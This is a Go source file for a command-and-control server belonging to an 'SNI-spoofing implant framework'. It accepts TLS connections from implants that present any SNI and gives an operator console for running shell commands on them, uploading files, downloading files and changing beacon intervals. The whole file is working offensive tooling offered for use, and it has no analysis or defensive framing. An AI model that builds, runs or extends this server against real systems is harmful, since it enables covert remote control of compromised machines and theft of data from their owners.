// Command server is the C2 listener for the SNI-spoofing implant framework.
//
// It listens on a configurable TCP/TLS port, accepts connections carrying
// ANY SNI value in the ClientHello (no validation), and exposes a shell-like
// operator interface for interacting with connected implants.
package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	tlsutil "github.com/openclaw/c2-sni-spoof/pkg/tls"
)

// ---------- Message types exchanged over TLS ----------

// Beacon is sent by the implant on each poll cycle.
type Beacon struct {
	Type     string `json:"type"`              // "beacon"
	Hostname string `json:"hostname"`          // machine hostname
	PID      int    `json:"pid"`               // process ID
	BeaconID int64  `json:"beacon_id"`         // monotonic counter
	SNI      string `json:"sni,omitempty"`     // the SNI the client used
}

// Command is sent from server → implant.
type Command struct {
	Type      string `json:"type"`               // "exec" | "upload" | "download" | "beacon" | "ping" | "noop"
	Payload   string `json:"payload,omitempty"`  // e.g. shell command
	Filename  string `json:"filename,omitempty"` // for upload / download
	Data      string `json:"data,omitempty"`     // base64 file content (upload)
	BeaconSec int    `json:"beacon_sec,omitempty"`
	ID        int64  `json:"id,omitempty"` // command ID for tracing
}

// Result is sent from implant → server.
type Result struct {
	Type    string `json:"type"`             // "result" | "error"
	Command int64  `json:"command_id"`       // echoes the Command.ID
	Output  string `json:"output,omitempty"` // stdout / stderr
	Data    string `json:"data,omitempty"`   // base64 file data (download)
	Error   string `json:"error,omitempty"`
}

// ---------- Client state ----------

type Client struct {
	ID         string
	Conn       net.Conn
	Enc        *json.Encoder
	Dec        *json.Decoder
	Hostname   string
	SNI        string
	ConnectedAt time.Time
	LastSeen   time.Time
	BeaconSec  int
	pendingCmd atomic.Pointer[Command] // commands from operator (fire-and-forget)
}

func NewClient(id string, conn net.Conn, enc *json.Encoder, dec *json.Decoder) *Client {
	return &Client{
		ID:          id,
		Conn:        conn,
		Enc:         enc,
		Dec:         dec,
		ConnectedAt: time.Now(),
		LastSeen:    time.Now(),
		BeaconSec:   10,
	}
}

// ---------- Operator command parsing ----------

type OpCmd struct {
	Raw   string
	Parts []string
	Cmd   string
	Args  []string
}

func parseOpCmd(line string) OpCmd {
	parts := strings.Fields(line)
	if len(parts) == 0 {
		return OpCmd{Raw: line}
	}
	return OpCmd{
		Raw:   line,
		Parts: parts,
		Cmd:   strings.ToLower(parts[0]),
		Args:  parts[1:],
	}
}

// ---------- Global state ----------

var (
	clients   = make(map[string]*Client)
	clientsMu sync.RWMutex
)

var (
	selectedID string
	selectedMu sync.RWMutex
)

func listClients() string {
	clientsMu.RLock()
	defer clientsMu.RUnlock()
	if len(clients) == 0 {
		return "  (no clients connected)\n"
	}
	var b strings.Builder
	fmt.Fprintf(&b, "  %-8s %-20s %-30s %s\n", "ID", "Hostname", "SNI", "Last Seen")
	fmt.Fprintf(&b, "  %s\n", strings.Repeat("─", 76))
	for _, c := range clients {
		ago := time.Since(c.LastSeen).Truncate(time.Second)
		fmt.Fprintf(&b, "  %-8s %-20s %-30s %s ago\n",
			c.ID, c.Hostname, truncate(c.SNI, 28), ago)
	}
	selectedMu.RLock()
	sel := selectedID
	selectedMu.RUnlock()
	if sel != "" {
		c := getClient(sel)
		if c != nil {
			fmt.Fprintf(&b, "\n  selected: client %s (%s)\n", sel, c.Hostname)
		} else {
			fmt.Fprintf(&b, "\n  selected: client %s (gone)\n", sel)
		}
	}
	return b.String()
}

func getClient(id string) *Client {
	clientsMu.RLock()
	defer clientsMu.RUnlock()
	return clients[id]
}

func removeClient(id string) {
	clientsMu.Lock()
	delete(clients, id)
	clientsMu.Unlock()
	selectedMu.Lock()
	if selectedID == id {
		selectedID = ""
	}
	selectedMu.Unlock()
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max-3] + "..."
}

// ---------- Client handler goroutine ----------

var clientIDCounter uint64

func nextClientID() string {
	n := atomic.AddUint64(&clientIDCounter, 1)
	return fmt.Sprintf("c%d", n)
}

func handleClient(conn net.Conn) {
	var sni string
	if tlsConn, ok := conn.(*tls.Conn); ok {
		_ = tlsConn.Handshake() // ensure handshake is done
		sni = tlsutil.ExtractSNI(tlsConn)
	}

	id := nextClientID()
	enc := json.NewEncoder(conn)
	dec := json.NewDecoder(conn)
	c := NewClient(id, conn, enc, dec)
	c.SNI = sni

	clientsMu.Lock()
	clients[id] = c
	clientsMu.Unlock()

	fmt.Fprintf(os.Stderr, "\n[+] client %s connected (SNI: %q)\n", id, sni)

	defer func() {
		conn.Close()
		removeClient(id)
		fmt.Fprintf(os.Stderr, "\n[-] client %s disconnected\n", id)
	}()

	for {
		// Set a read deadline so we detect stale connections.
		conn.SetDeadline(time.Now().Add(90 * time.Second))

		var beacon Beacon
		if err := dec.Decode(&beacon); err != nil {
			if err != io.EOF {
				fmt.Fprintf(os.Stderr, "[!] client %s read error: %v\n", id, err)
			}
			return
		}

		c.LastSeen = time.Now()
		if beacon.Hostname != "" {
			c.Hostname = beacon.Hostname
		}

		// Pop pending command (atomic swap).
		cmd := c.pendingCmd.Swap(nil)

		// Build the command to send.
		sendCmd := &Command{Type: "noop"}
		if cmd != nil {
			sendCmd = cmd
		}

		// Send it.
		if err := enc.Encode(sendCmd); err != nil {
			fmt.Fprintf(os.Stderr, "[!] client %s write error: %v\n", id, err)
			return
		}

		// For noop / ping, no result expected — just loop.
		if sendCmd.Type == "noop" || sendCmd.Type == "ping" {
			continue
		}

		// Read result.
		var res Result
		if err := dec.Decode(&res); err != nil {
			fmt.Fprintf(os.Stderr, "[!] client %s result error: %v\n", id, err)
			return
		}

		// Print result to stderr (operator interface).
		output := res.Output
		if res.Type == "error" {
			output = "ERROR: " + res.Error
		}
		fmt.Fprintf(os.Stderr, "\n[→] result from %s (cmd #%d):\n%s\n",
			id, sendCmd.ID, output)
	}
}

// ---------- Send command helper ----------

func queueCommand(c *Client, cmd *Command) {
	c.pendingCmd.Store(cmd)
}

// ---------- Operator interface ----------

var helpText = `
Commands:
  help                        show this help
  clients / ls                list connected implants
  select <id>                 select an implant by ID
  exec <command...>           run shell command on selected implant
  upload <local> <remote>     upload a file to implant
  download <remote>           download a file from implant
  beacon <seconds>            set beacon interval on implant
  ping                        ping selected implant
  exit / quit                 shut down server
`

func runOperator() {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Println("SNI Spoof C2 Server")
	fmt.Println("Type 'help' for commands.")
	fmt.Print("\n> ")

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		oc := parseOpCmd(line)

		switch oc.Cmd {
		case "":
			// skip
		case "help":
			fmt.Print(helpText)
		case "clients", "ls":
			fmt.Print(listClients())
		case "select":
			if len(oc.Args) < 1 {
				fmt.Println("usage: select <id>")
				break
			}
			id := oc.Args[0]
			c := getClient(id)
			if c == nil {
				fmt.Printf("client %s not found\n", id)
				break
			}
			selectedMu.Lock()
			selectedID = id
			selectedMu.Unlock()
			fmt.Printf("selected client %s (%s)\n", id, c.Hostname)
		case "exec":
			c, err := getSelectedClient()
			if err != nil {
				fmt.Println(err)
				break
			}
			if len(oc.Args) < 1 {
				fmt.Println("usage: exec <command>")
				break
			}
			cmd := &Command{
				Type:    "exec",
				Payload: strings.Join(oc.Args, " "),
				ID:      nextCmdID(),
			}
			queueCommand(c, cmd)
			fmt.Printf("queued exec #%d on %s: %s\n", cmd.ID, c.ID, cmd.Payload)

		case "upload":
			c, err := getSelectedClient()
			if err != nil {
				fmt.Println(err)
				break
			}
			if len(oc.Args) < 2 {
				fmt.Println("usage: upload <local_path> <remote_path>")
				break
			}
			localPath := oc.Args[0]
			remotePath := oc.Args[1]
			data, err := os.ReadFile(localPath)
			if err != nil {
				fmt.Printf("error reading %s: %v\n", localPath, err)
				break
			}
			encoded := base64.StdEncoding.EncodeToString(data)
			cmd := &Command{
				Type:     "upload",
				Filename: remotePath,
				Data:     encoded,
				ID:       nextCmdID(),
			}
			queueCommand(c, cmd)
			fmt.Printf("queued upload #%d (%d bytes → %s)\n", cmd.ID, len(data), remotePath)

		case "download":
			c, err := getSelectedClient()
			if err != nil {
				fmt.Println(err)
				break
			}
			if len(oc.Args) < 1 {
				fmt.Println("usage: download <remote_path>")
				break
			}
			cmd := &Command{
				Type:     "download",
				Filename: oc.Args[0],
				ID:       nextCmdID(),
			}
			queueCommand(c, cmd)
			fmt.Printf("queued download #%d for %s\n", cmd.ID, oc.Args[0])

		case "beacon":
			c, err := getSelectedClient()
			if err != nil {
				fmt.Println(err)
				break
			}
			if len(oc.Args) < 1 {
				fmt.Println("usage: beacon <seconds>")
				break
			}
			sec, err := strconv.Atoi(oc.Args[0])
			if err != nil || sec < 1 {
				fmt.Println("beacon interval must be a positive integer")
				break
			}
			cmd := &Command{
				Type:      "beacon",
				BeaconSec: sec,
				ID:        nextCmdID(),
			}
			queueCommand(c, cmd)
			fmt.Printf("queued beacon interval change to %ds\n", sec)

		case "ping":
			c, err := getSelectedClient()
			if err != nil {
				fmt.Println(err)
				break
			}
			cmd := &Command{
				Type: "ping",
				ID:   nextCmdID(),
			}
			queueCommand(c, cmd)
			fmt.Printf("queued ping on %s\n", c.ID)

		case "exit", "quit":
			fmt.Println("shutting down…")
			os.Exit(0)

		default:
			fmt.Printf("unknown command: %s (try 'help')\n", oc.Cmd)
		}
		fmt.Print("> ")
	}
}

func getSelectedClient() (*Client, error) {
	selectedMu.RLock()
	id := selectedID
	selectedMu.RUnlock()
	if id == "" {
		return nil, fmt.Errorf("no client selected — use `select <id>` first")
	}
	c := getClient(id)
	if c == nil {
		selectedMu.Lock()
		selectedID = ""
		selectedMu.Unlock()
		return nil, fmt.Errorf("selected client is gone")
	}
	return c, nil
}

var cmdIDCounter atomic.Int64

func nextCmdID() int64 {
	return cmdIDCounter.Add(1)
}

// ---------- main ----------

func main() {
	bind := flag.String("bind", "0.0.0.0:8443", "listen address:port")
	certFile := flag.String("cert", "server.crt", "TLS certificate file (PEM)")
	keyFile := flag.String("key", "server.key", "TLS key file (PEM)")
	caFile := flag.String("ca", "ca.crt", "CA certificate file (PEM)")
	flag.Parse()

	tlsCfg, err := tlsutil.ServerTLSConfig(*certFile, *keyFile, *caFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "TLS setup error: %v\n", err)
		os.Exit(1)
	}

	listener, err := tls.Listen("tcp", *bind, tlsCfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "listen error: %v\n", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Printf("[*] C2 server listening on %s (TLS, any SNI accepted)\n", *bind)

	// Handle Ctrl+C gracefully.
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	// Start operator interface.
	go runOperator()

	// Accept loop.
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				select {
				case <-sigCh:
					return
				default:
				}
				// Brief yield so we don't busy-loop on shutdown.
				time.Sleep(100 * time.Millisecond)
				continue
			}
			go handleClient(conn)
		}
	}()

	<-sigCh
	fmt.Println("\n[*] shutting down…")
}
